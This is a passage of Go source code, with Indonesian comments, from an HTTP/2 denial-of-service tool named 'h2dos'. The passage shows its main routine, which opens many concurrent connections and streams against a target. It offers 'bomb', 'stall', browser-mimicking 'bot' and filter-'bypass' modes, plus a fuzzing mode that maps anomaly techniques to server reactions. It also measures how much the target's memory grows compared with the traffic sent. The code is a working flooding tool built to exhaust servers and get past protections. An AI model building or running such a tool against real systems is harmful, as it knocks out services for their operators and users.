	if fezReaksi.m[tech] == nil {
		fezReaksi.m[tech] = map[string]int{}
	}
	fezReaksi.m[tech][reaksi]++
}

// printFezMap mencetak hubungan teknik anomali -> reaksi server.
func printFezMap() {
	fezReaksi.Lock()
	defer fezReaksi.Unlock()
	if len(fezReaksi.m) == 0 {
		return
	}
	type row struct {
		tech, reaksi string
		n            int
	}
	var rows []row
	for t, v := range fezReaksi.m {
		var tot int
		parts := []string(nil)
		for r, n := range v {
			tot += n
			parts = append(parts, fmt.Sprintf("%s x%d", r, n))
		}
		sort.Strings(parts)
		rows = append(rows, row{tech: t, reaksi: strings.Join(parts, ", "), n: tot})
	}
	sort.Slice(rows, func(i, j int) bool {
		if rows[i].n != rows[j].n {
			return rows[i].n > rows[j].n
		}
		return rows[i].tech < rows[j].tech
	})
	fmt.Println("\nPeta fez: teknik -> reaksi target")
	for _, r := range rows {
		fmt.Printf("  %-14s %6d  %s\n", r.tech, r.n, r.reaksi)
	}
}

func main() {
	flags()
	if cfg.listBypass {
		printBypassList()
		os.Exit(0)
	}
	if cfg.listFez {
		printFezList()
		os.Exit(0)
	}
	if err := cfg.validate(); err != nil {
		fmt.Fprintf(os.Stderr, "h2dos: %v\n\n", err)
		flag.Usage()
		os.Exit(2)
	}
	if cfg.cpus > 0 {
		runtime.GOMAXPROCS(cfg.cpus)
	}
	ackFrames.Store(true)
	holdWindow.Store(cfg.mode == "bomb" || cfg.mode == "stall")
	browserLike.Store(cfg.mode == "bot")

	st := &stats{}
	lim := newBucket(cfg.rate)
	connLim = newBucket(cfg.connRate)

	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer stop()
	if cfg.dur > 0 {
		var cancel context.CancelFunc
		ctx, cancel = context.WithTimeout(ctx, cfg.dur)
		defer cancel()
	}
	started = time.Now()

	actx, acancel := context.WithCancel(ctx)
	defer acancel()
	baseKB, _ := rssTotal(cfg.rss)
	if cfg.probe != "" {
		go probeLoop(actx, st, probeURL(), acancel)
	}
	if cfg.rss != "" {
		go rssWatch(actx, st, acancel)
	}

	if !cfg.quiet || cfg.probe != "" || cfg.rss != "" {
		go reporter(actx, st)
	}
	fmt.Printf("h2dos: mode=%s target=%s (%s) conns=%d streams/konek=%d rate=%.0f/s\n",
		cfg.mode, cfg.target, map[bool]string{true: "h2", false: "h2c"}[cfg.scheme == "https"],
		cfg.conns, cfg.streams, cfg.rate)
	fmt.Printf("       %s\n", modeDesc(cfg.mode))
	if cfg.mode == "bypass" && cfg.bypassTest {
		bypassSelftest(&cfg)
	}

	var wg sync.WaitGroup
	for i := 0; i < cfg.conns; i++ {
		wg.Add(1)
		go func(i int) { defer wg.Done(); worker(actx, st, lim, i) }(i)
	}
	wg.Wait()
	acancel()

	reqs, resp, bytes, errs := st.snapshot()
	dt := time.Since(started).Seconds()
	if !cfg.quiet || cfg.probe != "" || cfg.rss != "" {
		fmt.Printf("\nSelesai dalam %.1fs | req=%d avgRPS=%.0f resp=%d keluar=%.1fMB masuk=%.1fMB koneksi=%d puncakRPS=%d\n",
			dt, reqs, float64(reqs)/dt, resp, float64(st.out.Load())/1e6, float64(bytes)/1e6,
			st.connsUp.Load(), st.peakRPS.Load())
		fmt.Printf("error: %s\n", topErrors(errs, 6))
		if cfg.rss != "" && st.peakRssKB.Load() > 0 {
			gainMB := float64(st.peakRssKB.Load()-baseKB) / 1024
			outMB := float64(st.out.Load()) / 1e6
			fmt.Printf("RAM target: awal=%.0fMB puncak=%.0fMB naik=%.0fMB | keluar=%.1fMB",
				float64(baseKB)/1024, float64(st.peakRssKB.Load())/1024, gainMB, outMB)
			if outMB > 0 {
				fmt.Printf(" | amplifikasi %.0fx", gainMB/outMB)
			}
			fmt.Println()
		}
	}
	if cfg.mode == "fez" {
		printFezMap()
	}
	if reqs == 0 && cfg.mode != "fez" {
		fmt.Println("Tidak ada request terkirim — periksa target/ALPN/firewall, atau jalankan dengan -v.")
		os.Exit(1)
	}
}
